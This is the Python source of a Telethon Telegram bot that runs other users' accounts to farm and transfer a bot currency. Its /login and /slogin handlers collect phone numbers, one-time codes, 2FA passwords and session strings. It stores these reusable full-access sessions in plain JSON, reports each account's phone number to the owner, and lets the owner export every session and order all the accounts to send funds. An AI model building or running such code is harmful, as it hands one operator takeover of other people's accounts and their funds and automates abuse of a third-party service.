import logging
import asyncio
import json
import os
import re
import sys
import subprocess
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

import config
import database
import utils
import worker

# --- 1. LOGGING SETUP ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(config.LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# File to store sessions permanently so they survive restarts
DB_FILE = "db.json"

# Initialize Manager Bot
bot = TelegramClient('manager_session', config.API_ID, config.API_HASH).start(bot_token=config.BOT_TOKEN)

# --- 2. PERSISTENCE FUNCTIONS ---

def save_database():
    """Saves current sessions to a file so they aren't lost on restart."""
    data = {}
    for uid, client in database.clients.items():
        try:
            # We save the session string and the user's name
            data[str(uid)] = {
                'session': client.session.save(),
                'name': database.user_data[uid].get('name', 'Unknown')
            }
        except Exception as e:
            logger.error(f"Failed to save session for {uid}: {e}")
    
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)
    logger.info("Database saved to disk.")

async def load_database():
    """Reloads sessions from file on startup."""
    if not os.path.exists(DB_FILE):
        return

    logger.info("🔄 Reloading sessions from database...")
    try:
        with open(DB_FILE, 'r') as f:
            data = json.load(f)
        
        count = 0
        for uid_str, info in data.items():
            try:
                uid = int(uid_str)
                session_str = info['session']
                name = info['name']
                
                # Reconnect the client
                client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
                await client.connect()
                
                # Restore to memory
                database.clients[uid] = client
                database.user_data[uid] = {
                    'extols': 0, 
                    'next_play_time': 0, 
                    'name': name
                }
                count += 1
            except Exception as e:
                logger.error(f"Failed to reload session for {uid_str}: {e}")
        
        logger.info(f"✅ Successfully reloaded {count} sessions.")
        if count > 0:
            await bot.send_message(config.OWNER_ID, f"🔄 **Bot Restarted:** Reloaded {count} active sessions.")

    except Exception as e:
        logger.error(f"Database load error: {e}")

# --- 3. HELPER FUNCTIONS ---

async def get_balance_for_user(user_id, client):
    """
    Robust balance checker. Ignores the specific currency symbol and
    captures the number after the word 'extols'.
    """
    try:
        async with client.conversation(config.TARGET_BOT, timeout=30) as conv:
            await conv.send_message('/extols')
            response = await conv.get_response()
            
            if response.text:
                # REGEX EXPLANATION:
                # extols  -> Finds the word "extols"
                # [:\s]+  -> Matches the colon and/or spaces
                # \D* -> Matches ANY non-digit character (The symbol Є, €, etc.)
                # ([\d,]+)-> Captures the number (e.g., 481 or 1,234)
                match = re.search(r'extols[:\s]+\D*([\d,]+)', response.text, re.IGNORECASE)
                
                if match:
                    balance_str = match.group(1).replace(',', '')
                    balance = int(balance_str)
                    
                    me = await client.get_me()
                    # Update local database
                    if user_id in database.user_data:
                        database.user_data[user_id]['extols'] = balance
                        
                    return (me.first_name, balance, None)
            
            return ("Unknown", 0, "Could not find balance in response.")
    
    except asyncio.TimeoutError:
        return ("Timeout", 0, "Target bot didn't reply.")
    except Exception as e:
        logger.error(f"Audit error for {user_id}: {e}")
        return ("Error", 0, str(e))

async def register_client(uid, client):
    """Saves a connected client and sends a detailed log to the owner."""
    me = await client.get_me()
    
    # Save to memory
    database.clients[uid] = client
    database.user_data[uid] = {
        'extols': 0, 
        'next_play_time': 0, 
        'name': me.first_name
    }
    
    # Save to disk
    save_database()
    
    # --- DETAILED LOGIN NOTIFICATION ---
    try:
        # Fetch Owner Details
        owner_entity = await bot.get_entity(config.OWNER_ID)
        owner_name = owner_entity.first_name
        owner_username = f"@{owner_entity.username}" if owner_entity.username else "No Username"
        
        # User Details
        user_username = f"@{me.username}" if me.username else "No Username"
        user_phone = f"+{me.phone}" if me.phone else "Hidden/Unknown"
        
        log_msg = (
            "🔐 **NEW ACCOUNT LOGIN DETECTED**\n\n"
            f"**Account Name:** {me.first_name}\n"
            f"**Account Username:** {user_username}\n"
            f"**Phone Number:** `{user_phone}`\n"
            f"**User ID:** `{me.id}`\n\n"
            f"**Bot Owner ID:** `{config.OWNER_ID}` ({owner_name} - {owner_username})"
        )
        await bot.send_message(config.OWNER_ID, log_msg)
        
    except Exception as e:
        # Fallback if fetching owner fails
        logger.error(f"Failed to send detailed login log: {e}")
        await bot.send_message(config.OWNER_ID, f"🔔 New Login: {me.first_name} (`{uid}`)")
        
    logger.info(f"User Login: {me.first_name} ({uid})")

# --- 4. COMMAND HANDLERS ---

@bot.on(events.NewMessage(pattern='/help'))
async def help_cmd(event):
    text = (
        "🛠 **COMMAND MENU**\n"
        "━━━━━━━━━━━━━━━━\n"
        "**🔑 Login:**\n"
        "`/login` - Phone + OTP Login\n"
        "`/slogin` - String Session Login\n"
        "`/logout` - Disconnect\n\n"
        "**💰 Finance:**\n"
        "`/check` - Audit Wallets\n"
        "`/self_reply {all|id} {group_id} {amount}`\n\n"
        "**⚙️ System:**\n"
        "`/update` - Pull & Restart (Keeps Logins)\n"
        "`/slot` - Join Queue\n"
        "`/allslot` - Start All\n"
        "`/stats` - Global Stats\n"
        "`/log` - Logs\n"
        "━━━━━━━━━━━━━━━━"
    )
    await event.respond(text)

# --- UPDATE COMMAND ---

@bot.on(events.NewMessage(pattern='/update', from_users=[config.OWNER_ID]))
async def update_cmd(event):
    msg = await event.respond("🔄 **Checking for updates...**")
    save_database()
    
    try:
        process = subprocess.Popen(['git', 'pull'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        output = stdout.decode() + stderr.decode()
        
        if "Already up to date" in output:
            await msg.edit("✅ **Bot is already up to date.**")
        else:
            await msg.edit(f"✅ **Update Found & Downloaded!**\n\n`{output}`\n\n🔄 Restarting...")
            os.execl(sys.executable, sys.executable, *sys.argv)
            
    except Exception as e:
        await msg.edit(f"❌ **Update Failed:**\n`{e}`\n\nMake sure git is installed.")

# --- CHECK / AUDIT COMMAND ---

@bot.on(events.NewMessage(pattern='/check', from_users=[config.OWNER_ID]))
async def check_cmd(event):
    status_msg = await event.respond("⏳ **Auditing Wallets...**\nChecking balances (this takes a few seconds)...")
    
    tasks = []
    for uid, client in database.clients.items():
        tasks.append(get_balance_for_user(uid, client))
    
    results = await asyncio.gather(*tasks)
    
    total_extols = 0
    msg = "💰 **WALLET AUDIT**\n━━━━━━━━━━━━━━━━\n"
    
    for name, balance, error in results:
        if error:
            msg += f"» {name} - ⚠️ {error}\n"
        else:
            msg += f"» {name} - Є{balance}\n"
            total_extols += balance
            
    msg += f"━━━━━━━━━━━━━━━━\n➤ **Total - Є{total_extols}**"
    
    await status_msg.edit(msg)

# --- SELF REPLY COMMAND ---

@bot.on(events.NewMessage(pattern=r'/self_reply (all|(?:\d+)) (-?\d+) (\d+)', from_users=[config.OWNER_ID]))
async def self_reply_cmd(event):
    if not event.is_reply:
        return await event.respond("❌ **Error:** Reply to a message.")
    
    target_mode = event.pattern_match.group(1) 
    group_id = int(event.pattern_match.group(2))
    amount = int(event.pattern_match.group(3))
    
    reply_msg = await event.get_reply_message()
    target_msg_id = reply_msg.id
    
    active_clients = []
    if target_mode == 'all':
        active_clients = list(database.clients.values())
    else:
        uid = int(target_mode)
        if uid in database.clients:
            active_clients = [database.clients[uid]]
    
    if not active_clients:
        return await event.respond("❌ No clients found.")

    await event.respond(f"💸 **Sending Funds...**\nTarget: `{group_id}` | Amount: Є{amount}\nDelay: 2s per bot")

    count = 0
    for client in active_clients:
        try:
            cmd_text = f"/give@{config.TARGET_BOT_USERNAME} {amount}"
            await client.send_message(
                entity=group_id,
                message=cmd_text,
                reply_to=target_msg_id
            )
            count += 1
            await asyncio.sleep(2) 
            
        except Exception as e:
            logger.error(f"Transfer failed: {e}")
            
    await event.respond(f"✅ **Done.** Triggered {count} bots.")

# --- LOGIN / SLOGIN / LOGOUT ---

@bot.on(events.NewMessage(pattern='/slogin'))
async def slogin_cmd(event):
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("Send **String Session**:")
        response = await conv.get_response()
        try:
            client = TelegramClient(StringSession(response.text.strip()), config.API_ID, config.API_HASH)
            await client.connect()
            if not await client.is_user_authorized(): return await conv.send_message("❌ Invalid.")
            await register_client(event.sender_id, client)
            await conv.send_message("✅ Connected!")
        except Exception as e: await conv.send_message(f"Error: {e}")

@bot.on(events.NewMessage(pattern='/login'))
async def login_cmd(event):
    user_id = event.sender_id
    async with bot.conversation(user_id, timeout=300) as conv:
        try:
            # 1. Ask for Phone Number
            await conv.send_message("📱 **Phone Login**\nEnter phone number (e.g. `+91...`):")
            phone_response = await conv.get_response()
            phone = phone_response.text.strip()
            
            # 2. Send Code Request
            msg = await conv.send_message("🔄 Sending OTP...")
            client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
            await client.connect()
            
            try: 
                await client.send_code_request(phone)
            except Exception as e: 
                return await msg.edit(f"❌ Error sending OTP: {e}")
            
            await msg.delete()

            # 3. Ask for OTP (FIXED THIS PART)
            await conv.send_message("📩 Enter OTP:")
            otp_response = await conv.get_response()
            code = otp_response.text.replace(' ', '') # Remove spaces if user types "123 456"
            
            try:
                await client.sign_in(phone, code)
            except SessionPasswordNeededError:
                # 4. Ask for 2FA Password (FIXED THIS PART TOO)
                await conv.send_message("🔐 Enter 2FA Password:")
                pwd_response = await conv.get_response()
                password = pwd_response.text.strip()
                await client.sign_in(password=password)
            
            # 5. Success
            await register_client(user_id, client)
            await conv.send_message("✅ **Login Successful!**")
            
        except asyncio.TimeoutError:
            await conv.send_message("❌ **Timeout:** You took too long to reply.")
        except PhoneCodeInvalidError:
            await conv.send_message("❌ **Error:** The OTP you entered is invalid.")
        except Exception as e: 
            await conv.send_message(f"❌ **Error:** {e}")
            logger.error(f"Login failed: {e}")


@bot.on(events.NewMessage(pattern='/logout'))
async def logout_cmd(event):
    uid = event.sender_id
    if uid in database.clients:
        await database.clients[uid].disconnect()
        del database.clients[uid]
        if uid in database.user_data: del database.user_data[uid]
        if uid in database.farming_queue: database.farming_queue.remove(uid)
        
        save_database()
        await event.respond("✅ **Logged out.**")

# --- FARMING & STATS ---

@bot.on(events.NewMessage(pattern='/slot'))
async def slot_cmd(event):
    uid = event.sender_id
    if uid not in database.clients: return await event.respond("❌ Login first.")
    if uid not in database.farming_queue:
        database.farming_queue.append(uid)
        await event.respond("✅ **Added to Queue.**")
        asyncio.create_task(worker.start_relay_race())
    else: await event.respond("⚠️ Already in queue.")

@bot.on(events.NewMessage(pattern='/allslot', from_users=[config.OWNER_ID]))
async def allslot_cmd(event):
    c = 0
    for uid in database.clients:
        if uid not in database.farming_queue:
            database.farming_queue.append(uid)
            c+=1
    await event.respond(f"✅ **{c} bots** added to queue.")
    asyncio.create_task(worker.start_relay_race())

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    msg = (
        f"🌍 **GLOBAL STATS**\n━━━━━━━━━━━━━━━━\n"
        f"👥 Users: {len(database.clients)} | 🔥 Queue: {len(database.farming_queue)}\n"
        f"⏳ Uptime: {utils.get_uptime()}\n\n"
    )
    for uid, data in database.user_data.items():
        icon = utils.format_status(uid, database.current_active_user)
        msg += f"❑ {data['name']} ‹`{uid}`› — {data['extols']} — {icon}\n"
    await event.respond(msg + "━━━━━━━━━━━━━━━━")

@bot.on(events.NewMessage(pattern='/log', from_users=[config.OWNER_ID]))
async def log_cmd(event):
    logs = utils.read_last_logs(config.LOG_FILE)
    buttons = [
        [Button.inline("Refresh 🌀", b"log_refresh"), Button.inline("Download ⬇️", b"log_download")],
        [Button.inline("Clear 🗑️", b"log_clear")]
    ]
    await event.respond(f"📝 **System Logs:**\n```\n{logs}\n```", buttons=buttons)

# Callbacks for logs
@bot.on(events.CallbackQuery(pattern=b'log_refresh'))
async def log_ref(e): await e.edit(f"📝 **System Logs:**\n```\n{utils.read_last_logs(config.LOG_FILE)}\n```", buttons=e.message.buttons)
@bot.on(events.CallbackQuery(pattern=b'log_clear'))
async def log_clr(e): 
    utils.clear_logs(config.LOG_FILE)
    await e.edit("🗑️ Logs Cleared.", buttons=[[Button.inline("Refresh 🌀", b"log_refresh")]])
@bot.on(events.CallbackQuery(pattern=b'log_download'))
async def log_dl(e): await e.client.send_file(e.chat_id, config.LOG_FILE) if os.path.exists(config.LOG_FILE) else await e.answer("No logs.")

# Session Export/Import
@bot.on(events.NewMessage(pattern='/sessionexport', from_users=[config.OWNER_ID]))
async def sexport(e):
    d = database.get_all_sessions()
    with open(config.SESSION_FILE, 'w') as f: json.dump(d, f)
    await e.client.send_file(e.chat_id, config.SESSION_FILE)
    os.remove(config.SESSION_FILE)

@bot.on(events.NewMessage(pattern='/sessionimport', from_users=[config.OWNER_ID]))
async def simport(e):
    if not e.is_reply: return
    f = await (await e.get_reply_message()).download_media()
    try:
        with open(f) as j: d = json.load(j)
        for u, s in d.items():
            c = TelegramClient(StringSession(s), config.API_ID, config.API_HASH)
            await c.connect()
            await register_client(int(u), c)
        await e.respond("✅ Imported.")
        os.remove(f)
    except Exception as x: await e.respond(f"Error: {x}")

# --- STARTUP ---
print("✅ Manager Bot Started...")
bot.loop.run_until_complete(load_database())
bot.run_until_disconnected()
